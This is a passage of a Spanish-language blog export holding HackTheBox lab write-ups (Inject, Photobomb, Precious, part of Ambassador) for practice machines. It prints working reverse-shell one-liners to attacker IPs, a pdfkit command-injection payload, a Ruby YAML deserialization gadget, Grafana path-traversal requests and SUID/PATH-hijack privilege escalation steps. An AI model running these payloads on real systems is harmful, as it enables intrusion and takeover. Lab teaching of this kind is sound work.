debe llegar.❯ nc -lvnp 443listening on [any] 443 ...connect to [10.10.14.170] from (UNKNOWN) [10.129.178.241] 48474frank@inject:/$Aplicamos tratamiento a la TTY.Migración de usuarioEn la carpeta personal del usuario listamos carpetas escondidadfrank@inject:~$ ls -a.  ..  .bash_history  .bashrc  .cache  .local  .m2  .profilefrank@inject:~$ la carpeta .m2 nos llama la atención, listamos su contenidofrank@inject:~$ ls .m2settings.xmlfrank@inject:~$ cat .m2/*&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;settings xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"        xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;  &lt;servers&gt;    &lt;server&gt;      &lt;id&gt;Inject&lt;/id&gt;      &lt;username&gt;phil&lt;/username&gt;      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;      &lt;filePermissions&gt;660&lt;/filePermissions&gt;      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;      &lt;configuration&gt;&lt;/configuration&gt;    &lt;/server&gt;  &lt;/servers&gt;&lt;/settings&gt;frank@inject:~$ Vemos la contraseña del usuario phil, migramos…frank@inject:~$ su philPassword:DocPhillovestoInject123 phil@inject:/home/frank$ …en su carpeta personal procedemos a leer la primera flag.phil@inject:~$ cat user.txt be****************************36phil@inject:~$ Escalada de PrivilegiosNo encontramos ningun binario SUID o permiso sudo, pero si si vemos a los grupos que pertenecemos vemos un grupo extraño staff.phil@inject:~$ iduid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)phil@inject:~$ Si listamos si tenemos capacidad para dicho grupo nos encontramos con estó.phil@inject:~$ find / -group staff -print 2&gt;/dev/null/opt/automation/tasks/root/var/localLa ruta /opt/automation/tasks nos llama la atención.phil@inject:~$ ls /opt/automation/tasks/playbook_1.ymlphil@inject:~$Si miramos el archivo se modificó recientemente, por lo cual puede que exista una tarea cron.Si volvemos a volver a checkear el archivo se modifico 2 minutos después.phil@inject:/opt/automation/tasks$ ls -lahtotal 12Kdrwxrwxr-x 2 root staff 4.0K Mar 13 01:46 .drwxr-xr-x 3 root root  4.0K Oct 20 04:23 ..-rw-r--r-- 1 root root   150 Mar 13 01:46 playbook_1.ymlphil@inject:/opt/automation/tasks$Un archivo .YML buscamos en internet el nombre del arvhivo “playbook”. Buscando en internet nos encotramos con este blog que nos lleva a un archivo de github. Creamos un archivo shell.yml con el siguiente contenido.Esto copiara la bash en la carpeta actual y la convertirá en SUID y podemos spawnear una shell como root.---                                                                                                               - name: shell                                                                                                    hosts: localhost  become: yes  tasks:  - name: hack    shell: \"cp /bin/bash . &amp;&amp; chmod +sx bash\"Una vez pasado los 2 minutos spawneamos la shell como root con:/usr/bin/ansible-playbook shell.yml./bash -pHurra!!!! somos root, procedemos a leer la flag del usuario rootbash-5.0# cat root.txt4e****************************67bash-5.0# Máquina Pwneada, sigue así muchacho."
  },
  
  {
    "title": "Photobomb WriteUp",
    "url": "/posts/photobomb-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, easy, command injection, path hijacking, virtual hosting",
    "date": "2023-02-03 17:00:00 +0100",
    





    "snippet": "Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path HijackingEscaneo NMAPAntes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 13:24 -04Initiating SYN Stealth Scan at 13:24Scanning 10.10.11.182 [65535 ports]Discovered open port 80/tcp on 10.10.11.182Discovered open port 22/tcp on 10.10.11.182Completed SYN Stealth Scan at 13:24, 17.92s elapsed (65535 total ports)Nmap scan report for 10.10.11.182Host is up, received user-set (0.16s latency).Scanned at 2023-02-04 13:24:12 -04 for 18sNot shown: 61907 closed tcp ports (reset), 3626 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 18.08 seconds           Raw packets sent: 87248 (3.839MB) | Rcvd: 67894 (2.716MB)Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:echo \"10.10.11.182       photobomb.htb\" | tee -a /etc/hostsEnumeraciónVemos una pagina de inicio con un redirect a /printer Web SiteSi intentamos acceder nos pedirá credenciales Log inPodemos probar credenciales típicas por defecto, pero no resultará útil.admin:adminadmin:passwordadmin:passguest:guestSi revisamos el código fuente nos encontramos con cosaas interesantes.Le aplicamos un curl.❯ curl -s -X GET http://photobomb.htb&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;Photobomb&lt;/title&gt;  &lt;link type=\"text/css\" rel=\"stylesheet\" href=\"styles.css\" media=\"all\" /&gt;  &lt;script src=\"photobomb.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=\"container\"&gt;    &lt;header&gt;      &lt;h1&gt;&lt;a href=\"/\"&gt;Photobomb&lt;/a&gt;&lt;/h1&gt;    &lt;/header&gt;    &lt;article&gt;      &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt;      &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt;      &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt;      &lt;p&gt;To get started, please &lt;a href=\"/printer\" class=\"creds\"&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt;      &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt;    &lt;/article&gt;  &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Podemos ver un script de JavaScript, si vemos su contenido se nos filtra una cookie❯ curl -s -X GET http://photobomb.htb/photobomb.jsfunction init() {  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me  if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) {    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');  }}window.onload = init;Al copiar dicha cookie, podemos ver el panel /printer.Log inExplotaciónEn este apartado vemos unas imagenes las cuales podemos descargar y hacer pequeñas modificaciones como ser:  Cambiarle la extensión y modicar el tamaño.PrinterPodemos interceptar la petición con BurpSuite y ver mas a detalles como se estructura todoBurpSuitePodemos ver si es vulnerable a un Command injection, pero antes que nada inicia un servidor con pythonpython -m http.server 80Mandamos la petición al Repeater, para ello presionamos Ctrl + RSi nos fijamos en los parametros podemos agregar ; y añadir nuestro comando, se vería asíBurpSuitePodemos ver que no le gusta en algunos parametros, pero con haciendo prueba y error encontramos que el parametro filetype es vulnerable, lo podemos comprobar en la petición❯ python -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.182 - - [04/Feb/2023 14:45:12] \"GET / HTTP/1.1\" 200 -Podemos intentar enviarnos una reverse shell, usano esta página podemos hacer la reverse shell con varias opciones.Probaremos con bash pero no funciona, así que podemos probar con python3 y esta nos lanzará la shellexport RHOST=\"10.10.14.25\";export RPORT=444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'RCE  Nota: Si usas nc mkfifo y url encode te lanzará la shell igualrm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.25%20444%20%3E%2Ftmp%2FfGanamos acceso a la máquina, estamos listos para rootearla❯ nc -lvnp 444listening on [any] 444 ...connect to [10.10.14.25] from (UNKNOWN) [10.10.11.182] 49946wizard@photobomb:~/photobomb$ Toca realizar un tratamiento a la tty, te puedes guiar de mi blog.Una vez adentro podemos leer la primera flagwizard@photobomb:~/photobomb$ cat ../user.txt 06****************************78wizard@photobomb:~/photobomb$ Escalada de privilegiosSi vemos los privilegios SUDOERS vemos que podemos ejecutar un programa hecho en bashwizard@photobomb:~/photobomb$ sudo -lMatching Defaults entries for wizard on photobomb:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser wizard may run the following commands on photobomb:    (root) SETENV: NOPASSWD: /opt/cleanup.shwizard@photobomb:~/photobomb$ Vemos que lo podemos ejecutar sin proporcionar ninguna contraseña, es decir que al ejecuralo como sudo sera ejecutado de forma temporal como root sin proporcionar contraseñawizard@photobomb:~/photobomb$ sudo /opt/cleanup.sh wizard@photobomb:~/photobomb$ Si vemos el contenido de dicho archivo nos encontramos con binarios que podemos usar para elevar nuestros privilegios.wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh #!/bin/bash. /opt/.bashrccd /home/wizard/photobomb# clean up log filesif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]then  /bin/cat log/photobomb.log &gt; log/photobomb.log.old  /usr/bin/truncate -s0 log/photobomb.logfi# protect the priceless originalsfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;wizard@photobomb:~/photobomb$ Vemos que el binario find esta con ruta relativa no absoluta y esto puede derivar a un Path Hijacking,Podemos aprovechar que podemos cambiar variables de entorno como el Path para que nos ejecute el comando find personalizado, y bajo el contexto de sudo nuestro binario find lo ejecutará root.wizard@photobomb:/tmp$ echo bash &gt; findwizard@photobomb:/tmp$ chmod 777 find wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.shwizard@photobomb:/tmp$ ls -l /bin/bashroot@photobomb:/home/wizard/photobomb# Ya rooteamos la máquina, lo que hicimos fue hacer un binario perzonalizado find que nos lanze una bash como root, en este caso, ya que el esta ejecutando el /opt/cleanup.sh con el binario find de forma relativa.Procedemos a leer la flagroot@photobomb:/home/wizard/photobomb# cat /root/root.txt 74****************************35root@photobomb:/home/wizard/photobomb# ¡¡¡Máquina Pwneada!!! Te deseo un Feliz Hackeo."
  },
  
  {
    "title": "Precious WriteUp",
    "url": "/posts/precious-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, virtual hosting, command injection, pdfkit, easy, virtual hosting",
    "date": "2023-01-16 17:00:00 +0100",
    





    "snippet": "Les explicaré cómo comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la escalada cargaremos un archivo para convertir la BASH en SUID.Identificando el OSPara ello debemos enviar una traza ICMP(Internet Control Message Protocol), estas siglas sinifican Protocolo de Mensajes de Control de Internet y con la información que nos reporte podemos identificar el SO mediante el TTL(Time To live)❯ ping -c1 10.10.11.189PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=146 ms--- 10.10.11.189 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 146.342/146.342/146.342/0.000 msVemos lo siguiente:  TTL          El TTL es 63, esto indica que es una máquina Linux, ya que dichas máquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad.      Primeros pasosSi le aplicamos un curl con modo silent y para ver por las cabeceras y filtrando por location vemos un dominio❯ curl s 10.10.11.189 -i | grep LocationLocation: http://precious.htb/Sabiendo que se aplica Virtual Hosting debemos agregar el dominio al /etc/hostsecho 10.10.11.189   precious.htb   | tee -a /etc/hostsEscaneo NMAPSiempre que queramos auditar una máquina debemos aplicar un escaneo NMAP, ya que nos permitirá saber que puertos estan abiertos para poder empezar la fase de explotación❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.189Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:45 -04Initiating SYN Stealth Scan at 12:45Scanning 10.10.11.189 [65535 ports]Discovered open port 80/tcp on 10.10.11.189Discovered open port 22/tcp on 10.10.11.189Completed SYN Stealth Scan at 12:46, 15.23s elapsed (65535 total ports)Nmap scan report for 10.10.11.189Host is up, received user-set (0.16s latency).Scanned at 2023-02-19 12:45:56 -04 for 15sNot shown: 65471 closed tcp ports (reset), 62 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 15.35 seconds           Raw packets sent: 74834 (3.293MB) | Rcvd: 73784 (2.951MB)  Vemos los puertos          22 este puerto corre por defecto el servicio SSH      80 este es el encargado del purto WEB, es decir el HTTP      EnumeraciónVemos que en la web podemos convertir una Web a PDF, suena interesante, así que nos creamos un archivo .html con la siguiete estructuraPágina Web❯ cat index.html&lt;h1&gt; Hola Mundo &lt;/h1&gt;Creamos un servivor HTTP con python por el puerto 80 y en dicha web ponemos nustro servidor.  Recuerda cambiar tu IP.WEBAl darle Submit nos genera el PDF, si miramos los metadatos vemos la versión de PDFKIT❯ exiftool PDF.pdfExifTool Version Number         : 12.16File Name                       : PDF.pdfDirectory                       : .File Size                       : 10 KiBFile Modification Date/Time     : 2023:02:19 13:10:53-04:00File Access Date/Time           : 2023:02:19 13:10:53-04:00File Inode Change Date/Time     : 2023:02:19 13:11:14-04:00File Permissions                : rw-r--r--File Type                       : PDFFile Type Extension             : pdfMIME Type                       : application/pdfPDF Version                     : 1.4Linearized                      : NoPage Count                      : 1Creator                         : Generated by pdfkit v0.8.6Al hacer una simple busqueda por google, nos encontramos con este articuloAl usar este payload, debemos cambiar el sleep por una reverse shell.http://example.com/?name=#{'%20`sleep 5`'}Nos quedaría de esta manera.http://example.com/?name=#{'%20`bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.19/444 0&gt;&amp;1\"`'}Una vez enviada la petición nos llega la reverse shell❯ nc -lvnp 444listening on [any] 444 ...connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 47004bash: cannot set terminal process group (676): Inappropriate ioctl for devicebash: no job control in this shellruby@precious:/var/www/pdfapp$ Aplicamos un tratamiento a la TTYMigrando de UsuarioSomos el usuario ruby, si miramos en el directorio home por archivos ocultos nos encontramos con estoruby@precious:~$ ls -latotal 32drwxr-xr-x 5 ruby ruby 4096 Feb 19 12:28 .drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -&gt; /dev/null-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrcdr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundledrwxr-xr-x 4 ruby ruby 4096 Feb 19 08:27 .cachedrwxr-xr-x 3 ruby ruby 4096 Feb 19 12:28 .local-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profileSi leemos lo que exixte dentro de esa carpeta vemos las credenciales del usuario henryruby@precious:~$ cat .bundle/config ---BUNDLE_HTTPS://RUBYGEMS__ORG/: \"henry:Q3c1AqGHtoI0aXAYFH\"Migramos de usuarioruby@precious:~$ ssh henry@10.10.11.189The authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.ECDSA key fingerprint is SHA256:kRywGtzD4AwSK3m1ALIMjgI7W2SqImzsG5qPcTSavFU.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.189' (ECDSA) to the list of known hosts.henry@10.10.11.189's password: Q3c1AqGHtoI0aXAYFH Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Feb 19 10:46:31 2023 from 10.10.14.103henry@precious:~$ Procedemos a leer la flag del usuariohenry@precious:~$ cat user.txt 67****************************bchenry@precious:~$ Escalada de PrivilegiosViendo por permisos SUDO nos encontramos con estehenry@precious:~$ sudo -lMatching Defaults entries for henry on precious:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser henry may run the following commands on precious:    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rbSi leemos ese archivo vemos que intenta cargar el archivo “dependencies.yml”, si buscamos por internet nos encontramos con este blog y este repositorio de GitHub, nos creamos un archi con este contenido.---- !ruby/object:Gem::Installer    i: x- !ruby/object:Gem::SpecFetcher    i: y- !ruby/object:Gem::Requirement  requirements:    !ruby/object:Gem::Package::TarReader    io: &amp;1 !ruby/object:Net::BufferedIO      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry         read: 0         header: \"abc\"      debug_output: &amp;1 !ruby/object:Net::WriteAdapter         socket: &amp;1 !ruby/object:Gem::RequestSet             sets: !ruby/object:Net::WriteAdapter                 socket: !ruby/module 'Kernel'                 method_id: :system             git_set: id         method_id: :resolveCambiamos el id por:  chmod +s /bin/bashCon esto nuestra BASH sera SUID---- !ruby/object:Gem::Installer    i: x- !ruby/object:Gem::SpecFetcher    i: y- !ruby/object:Gem::Requirement  requirements:    !ruby/object:Gem::Package::TarReader    io: &amp;1 !ruby/object:Net::BufferedIO      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry         read: 0         header: \"abc\"      debug_output: &amp;1 !ruby/object:Net::WriteAdapter         socket: &amp;1 !ruby/object:Gem::RequestSet             sets: !ruby/object:Net::WriteAdapter                 socket: !ruby/module 'Kernel'                 method_id: :system             git_set: chmod +s /bin/bash         method_id: :resolveEjecutamos el comandohenry@precious:~$ sudo ruby /opt/update_dependencies.rb henry@precious:~$ ls -l /bin/bash-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bashhenry@precious:~$ Ahora podemos lanzarnos la bash como root y leemos la flag de roothenry@precious:~$ bash -pbash-5.1# whoami &amp;&amp; idrootuid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry)bash-5.1# bash-5.1# cat /root/root.txt 85****************************f4bash-5.1# Acabamos de comprometer la máquina, Buena suerte."
  },
  
  {
    "title": "Ambassador WriteUp",
    "url": "/posts/ambassador-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "linux, hackthebox, writeup, grafana, directory transversal, arbitrary file read, medium",
    "date": "2023-01-16 17:00:00 +0100",
    





    "snippet": "Les explicare cómo comprometer la máquina Ambassador de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con una vulnerabilidad de tipo Directory Transversal y Arbitrary File Read. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos aprovecharemos de en exploit de Consul con un token que nos lanzará la shell como root.Escaneo NMAPEmpezamos enumerando con NMAP, con ello encontaremos los puertos abiertos y los servicios que se exponen.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.183 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 00:03 -04Initiating SYN Stealth Scan at 00:03Scanning 10.10.11.183 [65535 ports]Discovered open port 80/tcp on 10.10.11.183Discovered open port 3306/tcp on 10.10.11.183Discovered open port 22/tcp on 10.10.11.183Discovered open port 3000/tcp on 10.10.11.183Completed SYN Stealth Scan at 00:03, 17.01s elapsed (65535 total ports)Nmap scan report for 10.10.11.183Host is up, received user-set (0.32s latency).Scanned at 2023-01-21 00:03:39 -04 for 17sNot shown: 61030 closed tcp ports (reset), 4501 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 633000/tcp open  ppp     syn-ack ttl 633306/tcp open  mysql   syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 17.22 seconds           Raw packets sent: 82990 (3.652MB) | Rcvd: 66979 (2.679MB)Puerto 22 su servicio por defecto es SSH, 80 este puerto en su configuración por defecto corre el servicio HTTP, MySQL corre en el puerto 3306 y el puerto 3000 fue asignado por el administradorEnumeraciónPodemos realizar FUZZING para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encontramos y tratar de acceder a él.Viendo la web nos encontramos con esto:Grafana LoginViendo en la parte inferior nos da información acerca de la versión, usando searchsploit nos damos cuenta de que cuenta con estas vulnerabilidades Directory Traversal and Arbitrary File ReadSearchsploitPodemos copiar el script de Python en nuestra carpeta de trabajo e intentamos leer el /etc/passwd❯ searchsploit -m multiple/webapps/50581.py  Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read      URL: https://www.exploit-db.com/exploits/50581     Path: /snap/searchsploit/62/opt/exploitdb/exploits/multiple/webapps/50581.py    Codes: CVE-2021-43798 Verified: FalseFile Type: Python script, ASCII text executableCopied to: /home/h4ckerlite/Desktop/h4ckerlite/HTB/Máquinas/Ambassador/nmap/50581.pyLo ejecutamos…SearchsploitBuscando en internet acerca de este CVE nos encontramos con este blog, nos enseñan a explotarlo de forma manual.❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | grep sh$root:x:0:0:root:/root:/bin/bashdeveloper:x:1000:1000:developer:/home/developer:/bin/bashSi seguimos leyendo podemos ver que nos podemos descargar la base de datos curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.dbAhora procedemos a leer la base de datos, para ello debes tener instalado sqlite3 para verlo desde consola, ya que lo considero mas fácil.  sudo apt install sqlite3Sigueindo las instrucciones del blog leemos la base de datos. sqlite3 grafana.bdUna vez detro de la base de datos, procedemos a leer las tablas ❯ sqlite3 grafana.dbSQLite version 3.34.1 2021-01-20 14:10:07Enter \".help\" for usage hints.sqlite&gt; .tablesalert                       login_attempt             alert_configuration         migration_log             alert_instance              ngalert_configuration     alert_notification          org                       alert_notification_state    org_user                  alert_rule                  playlist                  alert_rule_tag              playlist_item             alert_rule_version          plugin_setting            annotation                  preferences               annotation_tag              quota                     api_key                     server_lock               cache_data                  session                   dashboard                   short_url                 dashboard_acl               star                      dashboard_provisioning      tag                       dashboard_snapshot          team                      dashboard_tag               team_member               dashboard_version           temp_user                 data_source                 test_data                 kv_store                    user                      library_element             user_auth                 library_element_connection  user_auth_token           sqlite&gt; Usando una query de SQL, leeremos las columnas de la tabla data_source.select * from data_source;Veremos algo cómo esto.sqlite&gt; SELECT * FROM data_source;2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-20 21:54:47|0|{}|1|uKewFgM4zsqlite&gt; Ganamos accesoDonde el parámetro -h corresponde al host -u  al user -p a la contraseñaAhora nos podemos conectar a MySQL debido a que conocemos el user y su contraseña.❯ mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!Welcome to the MariaDB monitor.  Commands end with ; or \\g.Your MySQL connection id is 47Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MySQL [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| grafana            || information_schema || mysql              || performance_schema || sys                || whackywidget       |+--------------------+6 rows in set (0,172 sec)MySQL [(none)]&gt; use whackywidget;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMySQL [whackywidget]&gt; show tables;+------------------------+| Tables_in_whackywidget |+------------------------+| users                  |+------------------------+1 row in set (0,396 sec)MySQL [whackywidget]&gt; SELECT * FROM users;+-----------+------------------------------------------+| user      | pass                                     |+-----------+------------------------------------------+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |+-----------+------------------------------------------+1 row in set (0,375 sec)MySQL [whackywidget]&gt; Vemos una contraseña, esta se encuentra cifrada en Base64, podemos decifrarla de la siguiente manera.echo \"YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==\" | base64 -d;echo anEnglishManInNewYork027468Con esas credenciales podemos conectarnos por SSH.❯ ssh developer@10.10.11.183The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.183' (ECDSA) to the list of known hosts.developer@10.10.11.183's password: anEnglishManInNewYork027468 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sat 21 Jan 2023 05:10:23 AM UTC  System load:  0.0               Processes:             229  Usage of /:   84.4% of 5.07GB   Users logged in:       0  Memory usage: 49%               IPv4 address for eth0: 10.10.11.183  Swap usage:   0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sat Jan 21 00:27:29 2023 from 10.10.14.105developer@ambassador:~$ export TERM=xtermdeveloper@ambassador:~$ Podemos leer la primara flag.developer@ambassador:~$ cat user.txt 565**************************1b5developer@ambassador:~$ Enumeración del sistemaEn la carpeta home buscamos por carpetas/archivos ocultos y encontramos un archivo de configuración de github.developer@ambassador:~$ ls -a.  ..  .bash_history  .bash_logout  .bashrc  .cache.gitconfig  .gnupg  .lesshst  .local  .profile  .ssh  snap  user.txtdeveloper@ambassador:~$ Si lo leemos nos dice la ruta donde se encuentra.developer@ambassador:~$ cat .gitconfig [user]    name = Developer    email = developer@ambassador.local[safe]    directory = /opt/my-appdeveloper@ambassador:~$ Si nos situamos en la carpeta /opt podemos ver el proyecto github.developer@ambassador:/opt/my-app$ ls -a.  ..  .git  .gitignore  env  whackywidgetdeveloper@ambassador:/opt/my-app$ Si hacemos un git -log podemos ver los últimos commits que se aplicarondeveloper@ambassador:/opt/my-app$ git logcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:47:36 2022 +0000    tidy config scriptcommit c982db8eff6f10f8f3a7d802f79f2705e7a21b55Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:44:45 2022 +0000    config scriptcommit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:47:01 2022 +0000    created project with django CLIcommit 4b8597b167b2fbf8ec35f992224e612bf28d9e51Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:44:11 2022 +0000    .gitignoredeveloper@ambassador:/opt/my-app$ Ahora haciendo un git show se nos mostrará información acerca de ese commit.developer@ambassador:/opt/my-app$ git showcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:47:36 2022 +0000    tidy config scriptdiff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.shindex 35c08f6..fc51ec0 100755--- a/whackywidget/put-config-in-consul.sh+++ b/whackywidget/put-config-in-consul.sh@@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app-# Export MYSQL_PASSWORD before running+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORDdeveloper@ambassador:/opt/my-app$ Ahora con una busqueda en Google encontramos una vía potencial de escalar nuestros privilegios.Escalada de privilegiosUsando el exploit de GatoGamer podemos elevar nuestros privilegios, nos descargamos el repositorio de GitHub**, nos montamos un servidor **HTTP con Pythonpython -m http.server 80En la máquina víctima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo.developer@ambassador:~$ wget http://10.10.14.61/exploit.py--2023-01-21 05:40:22--  http://10.10.14.61/exploit.pyConnecting to 10.10.14.61:80... connected.HTTP request sent, awaiting response... 200 OKLength: 1409 (1.4K) [text/x-python]Saving to: ‘exploit.py.1’exploit.py.1                                  100%[=================================================================================================&gt;]   1.38K  --.-KB/s    in 0s      2023-01-21 05:40:22 (95.1 MB/s) - ‘exploit.py.1’ saved [1409/1409]developer@ambassador:~$ En la máquina víctima ejecutamos lo siguiente.Nota: Recuerda cambiar tu IP de HTBEn nuestra máquina host nos ponemos en 